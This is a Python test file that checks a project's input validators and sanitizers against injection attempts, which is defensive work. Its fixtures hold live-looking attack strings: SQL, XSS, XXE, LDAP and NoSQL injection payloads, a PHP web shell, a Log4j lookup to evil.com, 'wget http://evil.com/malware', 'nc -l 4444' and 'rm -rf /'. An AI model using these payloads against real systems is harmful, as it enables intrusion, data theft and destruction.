"""Security tests for input validation and sanitization."""

import pytest
from pathlib import Path

from gaudi3_scale.security.validation import (
    SecurityValidator, SecurityValidationResult, SecurityThreat,
    AntiInjectionValidator, InputSanitizer
)
from gaudi3_scale.validation import DataValidator, ValidationResult


class TestSecurityValidator:
    """Test security validation functionality."""
    
    def setup_method(self):
        """Setup test environment."""
        self.validator = SecurityValidator()
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        # Test various SQL injection patterns
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'/*",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in injection_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_sql=True
            )
            assert isinstance(result, SecurityValidationResult)
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "SQL_INJECTION"
            assert result.threats[0].severity == "CRITICAL"
    
    def test_xss_detection(self):
        """Test XSS attack detection."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert('xss')>",
            "<div onclick='alert(1)'>Click me</div>",
            "expression(alert('xss'))"
        ]
        
        for payload in xss_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_xss=True
            )
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "XSS"
            assert result.threats[0].severity == "HIGH"
    
    def test_command_injection_detection(self):
        """Test command injection detection."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "&& rm -rf /",
            "; wget http://evil.com/malware",
            "| nc -l 4444"
        ]
        
        for payload in command_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_command=True
            )
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "COMMAND_INJECTION"
            assert result.threats[0].severity == "CRITICAL"
    
    def test_path_traversal_detection(self):
        """Test path traversal detection."""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "..%2f..%2f..%2fetc%2fpasswd"
        ]
        
        for payload in path_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_path=True
            )
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "PATH_TRAVERSAL"
            assert result.threats[0].severity == "HIGH"
    
    def test_ldap_injection_detection(self):
        """Test LDAP injection detection."""
        ldap_payloads = [
            "*)|(password=*",
            "*))%00",
            ")(cn=)",
            "*)|(|(password=*))",
            "*)(uid=*))(|(uid=*"
        ]
        
        for payload in ldap_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_ldap=True
            )
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "LDAP_INJECTION"
            assert result.threats[0].severity == "HIGH"
    
    def test_nosql_injection_detection(self):
        """Test NoSQL injection detection."""
        nosql_payloads = [
            "{'$ne': null}",
            "{'$where': 'function() { return true; }'}",
            "{'$regex': '.*'}",
            "{'$gt': ''}",
            "this.password",
            "sleep(5000)"
        ]
        
        for payload in nosql_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_nosql=True
            )
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "NOSQL_INJECTION"
            assert result.threats[0].severity == "HIGH"
    
    def test_xxe_detection(self):
        """Test XXE attack detection."""
        xxe_payloads = [
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<!ENTITY xxe SYSTEM 'http://evil.com/malware'>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>]>",
            "&xxe;"
        ]
        
        for payload in xxe_payloads:
            result = self.validator.validate_against_injection(
                payload, "test_field", check_xxe=True
            )
            assert not result.is_valid
            assert len(result.threats) > 0
            assert result.threats[0].type == "XXE"
            assert result.threats[0].severity == "HIGH"
    
    def test_safe_input_validation(self):
        """Test that safe inputs pass validation."""
        safe_inputs = [
            "normal text",
            "user@example.com",
            "John Doe",
            "123-456-7890",
            "Valid input with numbers 123",
            "Special chars: !@#$%^&*()_+ but safe"
        ]
        
        for safe_input in safe_inputs:
            result = self.validator.validate_against_injection(safe_input, "test_field")
            assert result.is_valid
            assert len(result.threats) == 0
    
    def test_file_upload_validation(self):
        """Test file upload security validation."""
        # Test malicious file extensions
        malicious_files = [
            ("malware.exe", b"fake exe content"),
            ("script.js", b"alert('xss');"),
            ("shell.php", b"<?php system($_GET['cmd']); ?>"),
            ("bad.bat", b"del /f /q C:\\*"),
        ]
        
        for filename, content in malicious_files:
            result = self.validator.validate_file_upload(filename, content)
            assert not result.is_valid
            assert len(result.threats) > 0
            assert any(threat.type == "MALICIOUS_FILE_TYPE" for threat in result.threats)
    
    def test_file_size_validation(self):
        """Test file size validation."""
        large_content = b"x" * (20 * 1024 * 1024)  # 20MB
        
        result = self.validator.validate_file_upload(
            "large_file.txt", 
            large_content,
            max_size=10 * 1024 * 1024  # 10MB limit
        )
        
        assert not result.is_valid
        assert any(threat.type == "FILE_SIZE_LIMIT" for threat in result.threats)
    
    def test_safe_file_upload(self):
        """Test safe file upload validation."""
        safe_files = [
            ("document.txt", b"This is a text document"),
            ("config.json", b'{"setting": "value"}'),
            ("data.csv", b"name,age,city\nJohn,30,NYC"),
        ]
        
        allowed_extensions = {".txt", ".json", ".csv"}
        
        for filename, content in safe_files:
            result = self.validator.validate_file_upload(
                filename, 
                content,
                allowed_extensions=allowed_extensions
            )
            assert result.is_valid
            assert len(result.threats) == 0


class TestAntiInjectionValidator:
    """Test anti-injection validator functionality."""
    
    def setup_method(self):
        """Setup test environment."""
        self.validator = AntiInjectionValidator()
    
    def test_sql_query_params_validation(self):
        """Test SQL query parameters validation."""
        # Test malicious parameters
        malicious_params = {
            "user_id": "1 OR 1=1",
            "name": "'; DROP TABLE users; --",
            "filter": "UNION SELECT password FROM users"
        }
        
        result = self.validator.validate_sql_query_params(malicious_params)
        assert not result.is_valid
        assert len(result.threats) > 0
        
        # Test safe parameters
        safe_params = {
            "user_id": "123",
            "name": "John Doe",
            "filter": "active"
        }
        
        result = self.validator.validate_sql_query_params(safe_params)
        assert result.is_valid
    
    def test_html_input_validation(self):
        """Test HTML input validation and sanitization."""
        malicious_html = "<script>alert('xss')</script><p>Normal content</p>"
        
        result = self.validator.validate_html_input(malicious_html, "content")
        
        # Should detect XSS but sanitize the content
        assert not result.is_valid  # Due to XSS detection
        assert len(result.threats) > 0
        
        # Sanitized value should be safe
        if hasattr(result, 'sanitized_value'):
            assert "<script>" not in result.sanitized_value
            assert "<p>Normal content</p>" in result.sanitized_value or "Normal content" in result.sanitized_value
    
    def test_json_input_validation(self):
        """Test JSON input validation."""
        # Test malicious JSON
        malicious_json = {
            "query": {"$where": "function() { return true; }"},
            "user": "admin'; DROP TABLE users; --"
        }
        
        result = self.validator.validate_json_input(malicious_json, "request_data")
        assert not result.is_valid
        assert len(result.threats) > 0
        
        # Test safe JSON
        safe_json = {
            "name": "John Doe",
            "age": 30,
            "email": "john@example.com"
        }
        
        result = self.validator.validate_json_input(safe_json, "user_data")
        assert result.is_valid
    
    def test_json_string_validation(self):
        """Test JSON string validation."""
        malicious_json_string = '{"user": "admin\\"; DROP TABLE users; --"}'
        
        result = self.validator.validate_json_input(malicious_json_string, "json_string")
        assert not result.is_valid
        assert len(result.threats) > 0


class TestInputSanitizer:
    """Test input sanitization functionality."""
    
    def setup_method(self):
        """Setup test environment."""
        self.sanitizer = InputSanitizer()
    
    def test_sql_sanitization(self):
        """Test SQL input sanitization."""
        malicious_input = "'; DROP TABLE users; --"
        sanitized = self.sanitizer.sanitize_for_sql(malicious_input)
        
        # Should escape single quotes and remove comments
        assert "''" in sanitized  # Escaped quote
        assert "DROP TABLE" not in sanitized
        assert "--" not in sanitized
    
    def test_html_sanitization(self):
        """Test HTML sanitization."""
        malicious_html = "<script>alert('xss')</script><p>Normal text</p>"
        sanitized = self.sanitizer.sanitize_for_html(malicious_html)
        
        # Should escape HTML entities
        assert "&lt;" in sanitized or "<script>" not in sanitized
        assert "&gt;" in sanitized or "</script>" not in sanitized
        assert "javascript:" not in sanitized
    
    def test_shell_sanitization(self):
        """Test shell command sanitization."""
        malicious_command = "; rm -rf / && echo 'hacked'"
        sanitized = self.sanitizer.sanitize_for_shell(malicious_command)
        
        # Should remove dangerous characters
        assert ";" not in sanitized
        assert "&" not in sanitized
        assert "|" not in sanitized
        assert "`" not in sanitized
        assert "$" not in sanitized
    
    def test_regex_sanitization(self):
        """Test regex sanitization."""
        malicious_regex = ".*(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$|(.*)+"
        sanitized = self.sanitizer.sanitize_for_regex(malicious_regex)
        
        # Should escape regex special characters
        assert "\\." in sanitized
        assert "\\*" in sanitized
        assert "\\(" in sanitized
        assert "\\)" in sanitized
        assert "\\[" in sanitized
        assert "\\]" in sanitized
    
    def test_ldap_sanitization(self):
        """Test LDAP input sanitization."""
        malicious_ldap = "*)|(password=*"
        sanitized = self.sanitizer.sanitize_for_ldap(malicious_ldap)
        
        # Should escape LDAP special characters
        assert "\\2a" in sanitized  # Escaped *
        assert "\\28" in sanitized  # Escaped (
        assert "\\29" in sanitized  # Escaped )
    
    def test_filename_sanitization(self):
        """Test filename sanitization."""
        malicious_filename = "../../etc/passwd<>:\"|?*\x00"
        sanitized = self.sanitizer.sanitize_filename(malicious_filename)
        
        # Should remove path traversal and dangerous characters
        assert ".." not in sanitized
        assert "/" not in sanitized
        assert "\x00" not in sanitized
        assert "<" not in sanitized
        assert ">" not in sanitized
        assert ":" not in sanitized
        assert "|" not in sanitized
        assert "?" not in sanitized
        assert "*" not in sanitized
    
    def test_url_sanitization(self):
        """Test URL sanitization."""
        dangerous_urls = [
            "javascript:alert('xss')",
            "vbscript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd"
        ]
        
        for url in dangerous_urls:
            sanitized = self.sanitizer.sanitize_url(url)
            assert sanitized == ""  # Should reject dangerous protocols
        
        # Test safe URL
        safe_url = "https://example.com/path?param=value"
        sanitized = self.sanitizer.sanitize_url(safe_url)
        assert sanitized == safe_url
    
    def test_log_message_sanitization(self):
        """Test log message sanitization."""
        malicious_log = "User login failed\r\nFAKE LOG: Admin login successful\x1b[31mRed text\x1b[0m"
        sanitized = self.sanitizer.sanitize_log_message(malicious_log)
        
        # Should remove CRLF injection and ANSI escape sequences
        assert "\r\n" not in sanitized
        assert "\x1b" not in sanitized
        assert "FAKE LOG" not in sanitized or " FAKE LOG" in sanitized  # May be converted to space


class TestDataValidatorSecurity:
    """Test security aspects of the main data validator."""
    
    def setup_method(self):
        """Setup test environment."""
        self.validator = DataValidator()
    
    def test_path_validation_security(self):
        """Test path validation security features."""
        dangerous_paths = [
            "../../etc/passwd",
            "/etc/shadow",
            "/proc/version",
            "/sys/class/net",
            "~/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for path in dangerous_paths:
            result = self.validator.validate_path(path, "file_path", must_exist=False)
            # Should either fail validation or issue warnings
            assert not result.is_valid or len(result.warnings) > 0
    
    def test_string_validation_security(self):
        """Test string validation security features."""
        # Test extremely long strings (potential DoS)
        long_string = "x" * 200000  # 200KB string
        result = self.validator.validate_string(long_string, "test_field")
        
        # Should issue warning for very long strings
        assert len(result.warnings) > 0 or not result.is_valid
    
    def test_dangerous_pattern_detection(self):
        """Test detection of dangerous patterns in strings."""
        dangerous_strings = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "eval(document.body)",
            "${jndi:ldap://evil.com/a}",  # Log4j exploit
            "<%=Runtime.getRuntime().exec(\"calc\")%>",
            "{{7*7}}",  # Template injection
        ]
        
        for dangerous_string in dangerous_strings:
            result = self.validator.validate_string(dangerous_string, "test_field")
            # Should detect dangerous patterns
            if result.is_valid:
                # At minimum should sanitize the input
                assert result.sanitized_value != dangerous_string
    
    def test_null_byte_handling(self):
        """Test null byte injection handling."""
        null_byte_strings = [
            "normal_file.txt\x00.php",
            "safe_input\x00; rm -rf /",
            "user@example.com\x00admin"
        ]
        
        for null_string in null_byte_strings:
            result = self.validator.validate_string(null_string, "test_field")
            
            # Should remove null bytes
            if result.sanitized_value:
                assert "\x00" not in result.sanitized_value
    
    def test_unicode_normalization_attacks(self):
        """Test unicode normalization attack prevention."""
        # Test unicode characters that might normalize to dangerous characters
        unicode_attacks = [
            "＜script＞alert（１）＜／script＞",  # Full-width characters
            "script", # Different script tags with various unicode
            "\u202Ejavascript:alert(1)\u202D",  # Right-to-left override
        ]
        
        for attack in unicode_attacks:
            result = self.validator.validate_string(attack, "test_field")
            # Should handle unicode normalization safely
            assert result.is_valid or len(result.errors) > 0
    
    def test_control_character_handling(self):
        """Test control character handling."""
        control_chars = "Normal text\x01\x02\x03\x04\x05\x06\x07\x08\x0B\x0C\x0E\x0F"
        result = self.validator.validate_string(control_chars, "test_field")
        
        # Should remove or handle control characters
        if result.sanitized_value:
            # Only newline (\x0A) and tab (\x09) should be allowed
            for char in result.sanitized_value:
                if ord(char) < 32 and char not in '\n\t':
                    assert False, f"Control character {repr(char)} not removed"


class TestSecurityIntegration:
    """Test security integration scenarios."""
    
    def test_layered_validation(self):
        """Test multiple layers of validation."""
        # Create a complex malicious payload
        complex_payload = {
            "username": "admin'; DROP TABLE users; --",
            "email": "<script>fetch('/admin/users').then(r=>r.json()).then(data=>alert(JSON.stringify(data)))</script>@evil.com",
            "profile": {
                "bio": "{{7*7}}${jndi:ldap://evil.com/exploit}",
                "website": "javascript:alert(document.cookie)"
            },
            "file_path": "../../etc/passwd",
            "search_query": "* OR 1=1 --"
        }
        
        validator = SecurityValidator()
        sanitizer = InputSanitizer()
        
        # Validate each field
        for field, value in complex_payload.items():
            if isinstance(value, dict):
                continue  # Skip nested objects for this test
            
            result = validator.validate_against_injection(str(value), field)
            
            if not result.is_valid:
                # Apply appropriate sanitization
                if "sql" in field.lower() or field == "search_query":
                    sanitized = sanitizer.sanitize_for_sql(str(value))
                elif "email" in field.lower() or "bio" in field.lower():
                    sanitized = sanitizer.sanitize_for_html(str(value))
                elif "path" in field.lower():
                    sanitized = sanitizer.sanitize_filename(str(value))
                elif "website" in field.lower():
                    sanitized = sanitizer.sanitize_url(str(value))
                else:
                    sanitized = sanitizer.sanitize_for_html(str(value))
                
                # Re-validate sanitized input
                result2 = validator.validate_against_injection(sanitized, field)
                
                # Sanitized input should be safer
                assert len(result2.threats) <= len(result.threats)
    
    def test_bypass_attempt_detection(self):
        """Test detection of common bypass attempts."""
        bypass_attempts = [
            # Double encoding
            "%253Cscript%253Ealert(1)%253C/script%253E",
            # Case variations
            "<ScRiPt>alert(1)</ScRiPt>",
            # Comment insertion
            "<scr<!---->ipt>alert(1)</script>",
            # Null byte insertion
            "<script\x00>alert(1)</script>",
            # Unicode bypass
            "<\u0073cript>alert(1)</script>",
            # Encoding bypass
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
        ]
        
        validator = SecurityValidator()
        
        for bypass in bypass_attempts:
            result = validator.validate_against_injection(bypass, "test_field", check_xss=True)
            # Should still detect as malicious
            assert not result.is_valid or len(result.threats) > 0